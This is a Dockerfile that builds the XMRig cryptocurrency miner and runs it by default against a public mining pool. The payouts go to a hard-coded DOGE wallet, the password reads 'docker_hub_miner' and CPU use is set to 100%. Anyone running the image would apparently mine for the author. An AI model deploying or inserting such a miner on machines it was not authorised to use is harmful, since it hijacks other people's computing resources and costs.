FROM ubuntu:18.04
MAINTAINER lemooljiang <jackeyjiang2015@gmail.com>

RUN apt update \
    && apt install -y git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev \
    && git clone https://github.com/xmrig/xmrig.git \
    && cd xmrig \
    && mkdir build \
    && cd build \
    && cmake ..  \
    && make 
RUN apt-get install docker   -y

ENTRYPOINT ["/xmrig/build/xmrig"]

CMD ["--url=rx.unmineable.com:3333", \
"--user=DOGE:DLDrFew1RpYyJbogXfNYcFX9dRUMAZLgj5.zhangyuchen30#blwg-cj16", \
"--pass=docker_hub_miner", \
"-k", "--max-cpu-usage=100"]
